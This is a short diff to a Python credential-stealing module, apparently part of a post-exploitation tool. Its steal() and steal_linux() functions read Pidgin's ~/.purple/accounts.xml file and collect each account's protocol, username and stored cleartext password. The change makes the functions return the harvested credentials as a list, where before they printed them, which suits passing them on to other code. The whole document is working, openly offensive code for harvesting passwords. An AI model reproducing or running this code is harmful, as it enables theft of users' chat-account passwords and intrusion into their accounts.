@@ -8,11 +8,12 @@ def steal():
 	# Only Linux is supported for now
 	if platform.system() == "Linux":
 		# Get the accounts (Linux)
-		steal_linux()
+		return steal_linux()
 	else:
-		print("[-] Only Linux is supported")
+		return ("[-] Only Linux is supported")
 # Linux steal method
 def steal_linux():
+	ret = list()
 	# Get the path
 	path = os.getenv("HOME") + "/.purple/accounts.xml"
 	try:
@@ -20,12 +21,11 @@ def steal_linux():
 		root = xml.parse(path).getroot()
 	except:
 		# Uh,oh file not found
-		print("[-] accounts.xml not found")
-		return
+		return ("[-] accounts.xml not found")
 	# Enumerate the accounts where password is present	
 	for acc in root:
 		# Check for password presence
 		if acc[2].tag == "password":
 			# The good/bad thing about Pidgin is that by default it stores cleartext passwords
-			print("[+] Protocol:{proto}\n    Username:{us}\n    Password:{pw}\n".format(us=acc[1].text,pw=acc[2].text,proto=acc[0].text.split('prpl-')[1]))
-
+			ret.append("[+] Protocol:{proto}\n    Username:{us}\n    Password:{pw}\n".format(us=acc[1].text,pw=acc[2].text,proto=acc[0].text.split('prpl-')[1]))
+	return ret
